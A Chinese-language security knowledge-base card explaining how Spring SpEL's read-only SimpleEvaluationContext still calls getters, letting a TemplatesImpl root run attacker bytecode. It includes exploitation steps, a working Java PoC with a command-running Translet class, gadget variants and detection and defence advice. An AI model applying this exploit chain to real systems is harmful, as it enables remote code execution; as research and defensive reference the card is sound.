---
id: web-java-expression-spel-simplecontext-property-getter-templatesimpl-rce
title: SimpleEvaluationContext 只读绑定仍调用 getter：SpEL 属性 outputProperties 触发 TemplatesImpl 字节码加载 RCE
type: scenario
domain: web
path: web/java/expression/spel
technique: simple-evaluation-context-getter-templatesimpl-rce
tags:
- java
- spring
- spel
- expression-injection
- simpleevaluationcontext
- getter
- templatesimpl
- bytecode
- rce
- gadget
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-07T23:45:01+08:00'
  notes: '已对照原文与全部6张图核对：图01 eval(person,"name") 调用 getName 输出 Name: nn0nkey（JDK 1.8.0_65）；图02 PropertyOrFieldReference.readProperty 的 contextObject=TemplatesImpl、name=outputProperties；图03 ReflectivePropertyAccessor.read 的 ReflectionUtils.makeAccessible+method.invoke(target)；图04 method 为 javax.xml.transform.Templates.getOutputProperties()；图05 findMethodForProperty 的 prefix=get/methodSuffix=OutputProperties 匹配逻辑（mustBeStatic/requiredReturnTypes 条件）；图06 eval(templates,"outputProperties") 弹计算器。卡内 _outputProperties 读取报 EL1008E、必须用 outputProperties 命中 getter、TemplatesImpl _bytecodes/_name/_tfactory 构造与 PoC 均与原文一致。单卡单一原子（受限 SimpleEvaluationContext 经 getter 触发 TemplatesImpl 字节码加载），无需拆分。未验证点：未本机复跑；原文未给 Spring/JDK 影响范围（仅截图环境 jdk1.8.0_65），未设 affected_versions；frontmatter 无 sources/source_url。dedup 为 new，最高 related 的 StandardEvaluationContext SpEL 卡为不同上下文/触发；dup-scan 中与 14802（数组赋值经 ObjectToObjectConverter 调构造器）pair 判 related，两条链不同，均保留。'
url: /docs/web/java/expression/spel/web-java-expression-spel-simplecontext-property-getter-templatesimpl-rce/
draft: false
kb_aliases:
- SimpleEvaluationContext 绕过
- forReadOnlyDataBinding getter
- SpEL outputProperties
- TemplatesImpl getOutputProperties
- 属性读取触发 getter
- SpEL 只读上下文 RCE
---

## 一句话结论

即使 SpEL 使用 `SimpleEvaluationContext.forReadOnlyDataBinding().build()`（设计上用于只读数据绑定、禁止 `T()`/`new`/任意方法调用），只要 root 对象可控且存在危险 getter，表达式读取同名属性（如 `outputProperties`）仍会经 `PropertyOrFieldReference.readProperty` 调用 `getOutputProperties()`；把 root 设为填好 `_bytecodes/_name/_tfactory` 的 `TemplatesImpl` 即可加载恶意字节码并执行命令。

## 原理

- `SimpleEvaluationContext` 限制的是类型引用、构造器与方法解析器，但属性读取仍由 `PropertyAccessor` 完成；本例的 `SimpleEvaluationContext.forReadOnlyDataBinding()` 环境仍会注册属性访问器（调试栈显示为 `ReflectivePropertyAccessor`）。
- 表达式 `outputProperties` 被解析为 `PropertyOrFieldReference`，`readProperty` 遍历 accessor；`ReflectivePropertyAccessor.canRead` → `findGetterForProperty` → `findMethodForProperty`，按 `get`/`is` 前缀加属性名匹配无参 getter，因此 `outputProperties` 命中 `javax.xml.transform.Templates#getOutputProperties()`。
- `findMethodForProperty` 只检查方法名、参数个数、是否要求静态、返回类型集合；`mustBeStatic=false` 且 `requiredReturnTypes` 为空时无额外限制。随后 `ReflectionUtils.makeAccessible(method)` 使非 public getter 也可访问，`method.invoke(target)` 直接执行。
- `TemplatesImpl.getOutputProperties()` 会走到 `newTransformer()` → `getTransletInstance()` → `defineTransletClasses()`，对 `_bytecodes` 中的字节码执行 `defineClass`；恶意 Translet 类（继承 `AbstractTranslet`）的静态初始化块随即执行任意命令。
- 直接写 `_outputProperties` 会失败（`EL1008E: Property or field '_outputProperties' cannot be found ... maybe not public or not valid?`），因为该字段非 public；必须使用无下划线、能被 getter 规则匹配的属性名。
- 根因：SimpleEvaluationContext 的“只读”并不等于“无副作用”——只读数据绑定仍会调用 getter，而 getter 本身可以是任意副作用 gadget。前提是 root 或表达式可由攻击者影响（如应用把外部对象作为 SpEL root、模板上下文注入、对象反序列化后再求值）。

## 触发条件

- 应用使用 `SimpleEvaluationContext.forReadOnlyDataBinding().build()` 且 `expression.getValue(context, root)` 的表达式或 root 对象可控。
- root 类上存在可触发副作用的 getter（如 `TemplatesImpl.getOutputProperties`、`JdbcRowSetImpl.getDatabaseMetaData`、数据源 `getConnection/getXAConnection` 等）。
- 运行环境含 Xalan `TemplatesImpl`（JDK 8 的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，或 classpath 中同类实现），且 Spring 版本按上述规则调用 getter。
- 无 getter/方法访问黑名单或属性白名单限制。

## 利用步骤

1. 用打印 getter 的测试类确认：`eval(person, "name")` 会调用 `getName()`，说明属性读取确实触发 getter。
2. 构造 `TemplatesImpl`：`_bytecodes` 为恶意 Translet 类字节（继承 `AbstractTranslet`，静态块执行命令），`_name` 任意，`_tfactory` 为 `TransformerFactoryImpl`。
3. 把 `TemplatesImpl` 作为 root，表达式用 `outputProperties`（不要用 `_outputProperties`）。
4. `getValue` 触发 `getOutputProperties → defineClass → 静态初始化`，命令执行。
5. 无回显时换内存马/回连；JDK 9+ 对 `com.sun.org.apache.xalan` 的模块访问可能受限，需要改用其他 Templates 实现或反射适配。

## PoC

```java
public static Object eval(Object root, String expr) {
    SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    SpelExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(expr);
    return expression.getValue(context, root);
}

TemplatesImpl templates = new TemplatesImpl();
byte[] code = Files.readAllBytes(Paths.get("Test.class"));
setFieldValue(templates, "_bytecodes", new byte[][] {code});
setFieldValue(templates, "_name", "calc");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

// 属性名 outputProperties 命中 getOutputProperties()，而不是字段 _outputProperties
eval(templates, "outputProperties");
```

恶意 Translet 类：

```java
public class Test extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    @Override public void transform(DOM d, SerializationHandler[] h) throws TransletException {}
    @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) throws TransletException {}
}
```

调用栈关键段：

```text
PropertyOrFieldReference.readProperty
→ ReflectivePropertyAccessor.canRead
→ ReflectivePropertyAccessor.findGetterForProperty / findMethodForProperty
→ ReflectionUtils.makeAccessible(method)
→ method.invoke(target)  // TemplatesImpl#getOutputProperties
→ TemplatesImpl.newTransformer → getTransletInstance → defineTransletClasses
→ ClassLoader.defineClass(_bytecodes) → 静态初始化 → RCE
```

## 变体与关联

- 变体：把 `getOutputProperties` 换成其他有副作用 getter，如 `JdbcRowSetImpl.getDatabaseMetaData`（JNDI）、数据源 `getConnection/getXAConnection`（JDBC→HSQL/CALL）、带文件/命令操作的 getter。
- 变体：若上下文只注册 `DataBindingPropertyAccessor`，其底层 BeanWrapper 同样会调用 getter；需按 Spring 版本实测确认哪条 accessor 命中。
- 关联：[[web-java-expression-spel-injection-to-rce]]（StandardEvaluationContext 下 `T()` 直接 RCE；本卡是“受限上下文”绕过）、[[web-java-expression-spel-restricted-reflection-memshell]]（`T()`/`new` 被禁用时用反射链）、[[web-java-deserialization-fastjson2-serialize-getter-templates-proxy-bypass]]（同样以 `getOutputProperties` 为 sink，但触发为 JSON 序列化 getter）、[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（Jackson POJONode 触发 getter）。
- 边界：root 不可控、表达式被白名单限制为固定属性、getter 被黑名单、或 classpath 无 TemplatesImpl/相关 gadget 时失效；JDK 17 下 `com.sun.org.apache.xalan` 默认不可访问，需要替代 Templates 实现。

## 检测与防御

- 检测：SpEL 表达式出现 `outputProperties`、`databaseMetaData`、`connection`、`xaConnection` 等属性名；root 类型为 `TemplatesImpl`/`JdbcRowSetImpl`/数据源等 gadget；异常栈含 `PropertyOrFieldReference.readProperty → ReflectivePropertyAccessor.findMethodForProperty → TemplatesImpl.getOutputProperties → defineTransletClasses`。
- 防御：不要对不可信表达式或不可信 root 求值；`SimpleEvaluationContext` 只应绑定简单 DTO，禁止把含危险 getter 的业务对象作为 root；使用属性白名单/只读 DTO 投影，避免直接暴露 `TemplatesImpl`、`JdbcRowSetImpl`、数据源等对象。
- 加固：升级 Spring 并评估 `SimpleEvaluationContext` 的属性访问行为；对 SpEL 输入做语法白名单；在 JDK 9+ 启用模块访问限制/自定义 TransformerFactory，阻断 Xalan 字节码加载路径。
